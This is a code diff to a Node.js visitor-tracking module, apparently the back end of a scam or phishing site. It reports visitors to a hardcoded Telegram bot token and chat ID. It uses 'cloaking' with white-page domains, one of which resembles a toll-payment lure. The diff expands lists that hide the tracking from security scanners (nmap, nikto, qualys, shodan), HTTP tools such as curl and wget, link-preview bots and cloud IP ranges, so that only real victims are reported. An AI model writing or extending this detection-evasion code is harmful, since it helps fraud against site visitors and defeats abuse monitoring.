@@ -24,6 +24,15 @@ try {
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8528667086:AAHrl7LOf7kimNCwfFNOFMPVkWgGTv_KUuM';
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003580814172';
 
+// ============ НАСТРОЙКИ ФИЛЬТРАЦИИ ============
+// Отправлять уведомления ТОЛЬКО при наличии активности пользователя
+// Если true - "Нет активности" посетители не будут отправлять первое уведомление
+// Уведомление придёт только когда пользователь совершит действие
+const ONLY_NOTIFY_WITH_ACTIVITY = process.env.ONLY_NOTIFY_WITH_ACTIVITY === 'true' || true;
+
+// Минимальное время на странице (мс) перед отправкой уведомления (если ONLY_NOTIFY_WITH_ACTIVITY=false)
+const MIN_TIME_BEFORE_NOTIFY = parseInt(process.env.MIN_TIME_BEFORE_NOTIFY) || 5000; // 5 секунд
+
 // Белая страница (клоака) - домены которые НЕ должны логироваться
 const WHITE_PAGE_DOMAINS = [
   'm50toll-lrlsh.com',
@@ -50,21 +59,94 @@ const activeSessions = new Map();
 // Clean old sessions after 30 minutes
 const SESSION_TIMEOUT = 30 * 60 * 1000;
 
-// Bot/Crawler User-Agent patterns to ignore
+// Bot/Crawler User-Agent patterns to ignore (РАСШИРЕННЫЙ СПИСОК)
 const BOT_PATTERNS = [
-  /googlebot/i, /bingbot/i, /yandexbot/i, /baiduspider/i,
-  /python-requests/i, /python-urllib/i, /aiohttp/i,
-  /curl\//i, /wget\//i, /httpie/i, /postman/i,
-  /bot\b/i, /crawler/i, /spider/i, /scraper/i,
+  // Поисковые боты
+  /googlebot/i, /bingbot/i, /yandexbot/i, /baiduspider/i, /duckduckbot/i,
+  /slurp/i, /msnbot/i, /teoma/i, /gigabot/i, /scrubby/i,
+  
+  // HTTP клиенты и библиотеки
+  /python-requests/i, /python-urllib/i, /aiohttp/i, /httpx/i,
+  /curl\//i, /wget\//i, /httpie/i, /postman/i, /insomnia/i,
+  /axios/i, /node-fetch/i, /got\//i, /request\//i, /undici/i,
+  /java\//i, /okhttp/i, /apache-httpclient/i, /jersey/i,
+  /go-http-client/i, /libwww-perl/i, /lwp-/i, /php\//i, /guzzle/i,
+  /ruby/i, /mechanize/i, /scrapy/i, /colly/i,
+  /amphp/i, /http-client/i, // amphp/http-client который виден в ваших логах
+  
+  // Общие паттерны ботов
+  /bot\b/i, /crawler/i, /spider/i, /scraper/i, /fetcher/i,
+  /monitor/i, /checker/i, /validator/i, /scanner/i, /probe/i,
+  
+  // Headless браузеры
   /headless/i, /phantom/i, /selenium/i, /puppeteer/i, /playwright/i,
-  /^Mozilla\/5\.0$/i, /^\s*$/,
+  /chromedriver/i, /webdriver/i, /nightwatch/i, /cypress/i,
+  
+  // SEO и аналитика
+  /semrush/i, /ahrefs/i, /moz\.com/i, /majestic/i, /screaming/i,
+  /seokicks/i, /sistrix/i, /linkdex/i, /blexbot/i,
+  
+  // Соцсети и мессенджеры (превью ссылок)
+  /facebookexternalhit/i, /twitterbot/i, /telegrambot/i, /whatsapp/i,
+  /linkedinbot/i, /slackbot/i, /discordbot/i, /skype/i,
+  
+  // Мониторинг и безопасность
+  /uptimerobot/i, /pingdom/i, /site24x7/i, /statuscake/i,
+  /newrelic/i, /datadog/i, /appdynamics/i,
+  /nessus/i, /qualys/i, /nikto/i, /nmap/i, /masscan/i,
+  /zgrab/i, /censys/i, /shodan/i, /zmap/i,
+  
+  // Пустые или подозрительные
+  /^Mozilla\/5\.0$/i, /^\s*$/, /^-$/i,
+  /compatible;\s*$/i, // Только "compatible;" без ничего
 ];
 
-// Suspicious paths that scanners try to access
+// Suspicious paths that scanners try to access (РАСШИРЕННЫЙ)
 const SUSPICIOUS_PATHS = [
-  /\.git\//i, /\.env/i, /\.htaccess/i, /wp-admin/i, /phpmyadmin/i,
-  /phpinfo/i, /\.sql$/i, /\.bak$/i, /\.backup$/i,
+  /\.git\//i, /\.env/i, /\.htaccess/i, /\.htpasswd/i,
+  /wp-admin/i, /wp-login/i, /wp-content/i, /wp-includes/i, /wordpress/i,
+  /phpmyadmin/i, /phpinfo/i, /adminer/i, /mysql/i,
+  /\.sql$/i, /\.bak$/i, /\.backup$/i, /\.old$/i, /\.orig$/i,
+  /\.config$/i, /\.ini$/i, /\.log$/i, /\.tmp$/i,
+  /admin\//i, /administrator/i, /login\.php/i, /setup-config/i,
+  /xmlrpc\.php/i, /cgi-bin/i, /shell/i, /cmd/i,
+  /\.asp$/i, /\.aspx$/i, /\.jsp$/i, // Неправильные расширения для Node.js сайта
+  /robots\.txt/i, /sitemap\.xml/i, // Поисковые боты
 ];
+
+// Известные IP диапазоны ботнетов и датацентров (первые октеты)
+const SUSPICIOUS_IP_PREFIXES = [
+  '43.130.',  // Tencent Cloud (часто боты)
+  '43.131.',
+  '43.132.',
+  '43.133.',
+  '43.134.',
+  '43.135.',
+  '34.28.',   // Google Cloud (часто сканеры)
+  '35.', // Google Cloud
+  '34.', // AWS/GCP
+  '52.', // AWS
+  '54.', // AWS  
+  '18.', // AWS
+  '3.', // AWS
+  '13.', // AWS
+  '23.92.', // OVH датацентр
+  '87.250.', // Yandex
+  '66.249.', // Google
+  '157.55.', // Microsoft/Bing
+  '40.77.',  // Microsoft
+  '207.46.', // Microsoft
+  '114.119.', // Baidu
+  '180.76.', // Baidu
+  '220.181.', // Baidu
+  '123.125.', // Baidu
+];
+
+// Функция проверки подозрительного IP
+function isSuspiciousIP(ip) {
+  if (!ip) return false;
+  return SUSPICIOUS_IP_PREFIXES.some(prefix => ip.startsWith(prefix));
+}
 
 setInterval(() => {
   const now = Date.now();
@@ -955,19 +1037,28 @@ const TRACKING_COOLDOWN = 2000; // 2 секунды между вызовами 
 function trackingMiddleware(req, res, next) {
   const userAgent = req.headers['user-agent'] || '';
   const path = req.url || req.path || '/';
+  const ip = getClientIP(req);
   
   // Пропустить статические файлы
   if (path.match(/\.(css|js|jpg|jpeg|png|gif|svg|ico|woff|woff2|ttf|eot|webp|mp4|mp3|pdf)$/)) {
     return next();
   }
   
-  // Пропустить ботов
+  // Пропустить ботов по User-Agent
   if (isBot(userAgent)) {
+    logger.debug(`[TG] Skipping bot by UA: ${userAgent.substring(0, 50)}`);
+    return next();
+  }
+  
+  // Пропустить подозрительные IP (датацентры, ботнеты)
+  if (isSuspiciousIP(ip)) {
+    logger.debug(`[TG] Skipping suspicious IP: ${ip}`);
     return next();
   }
   
   // Пропустить подозрительные пути
   if (isSuspiciousPath(path)) {
+    logger.debug(`[TG] Skipping suspicious path: ${path}`);
     return next();
   }
   
@@ -976,8 +1067,7 @@ function trackingMiddleware(req, res, next) {
     return next();
   }
   
-  // Защита от дублирования: проверяем, не вызывали ли мы trackPageRequest недавно для этого запроса
-  const ip = getClientIP(req);
+  // Защита от дублирования
   const requestKey = `${path}_${ip}`;
   const lastTrack = requestTracking.get(requestKey);
   const now = Date.now();
@@ -1016,16 +1106,23 @@ function trackingMiddleware(req, res, next) {
 async function handleTrackingAPI(req, res) {
   try {
     const userAgent = req.headers['user-agent'] || '';
+    const ip = getClientIP(req);
     
-    // Пропустить ботов
+    // Пропустить ботов по User-Agent
     if (isBot(userAgent)) {
       res.writeHead(200, { 'Content-Type': 'application/json' });
       res.end(JSON.stringify({ ok: true }));
       return;
     }
     
+    // Пропустить подозрительные IP
+    if (isSuspiciousIP(ip)) {
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ ok: true }));
+      return;
+    }
+    
     const sessionId = getSessionId(req);
-    const ip = getClientIP(req);
     
     let body = '';
     req.on('data', chunk => body += chunk);
@@ -1064,16 +1161,23 @@ function findSessionByIP(ip) {
 async function handleAnalyticsAPI(req, res) {
   try {
     const userAgent = req.headers['user-agent'] || '';
+    const ip = getClientIP(req);
     
-    // Пропустить ботов
+    // Пропустить ботов по User-Agent
     if (isBot(userAgent)) {
       res.writeHead(200, { 'Content-Type': 'image/gif' });
       res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
       return;
     }
     
+    // Пропустить подозрительные IP (датацентры, ботнеты)
+    if (isSuspiciousIP(ip)) {
+      res.writeHead(200, { 'Content-Type': 'image/gif' });
+      res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
+      return;
+    }
+    
     let sessionId = getSessionId(req);
-    const ip = getClientIP(req);
     
     let body = '';
     req.on('data', chunk => body += chunk);
@@ -1553,6 +1657,7 @@ module.exports = {
   getTrackingScript,
   getSessionId,
   isBot,
+  isSuspiciousIP,
   isSuspiciousPath,
   isWhitePageRequest,
 };
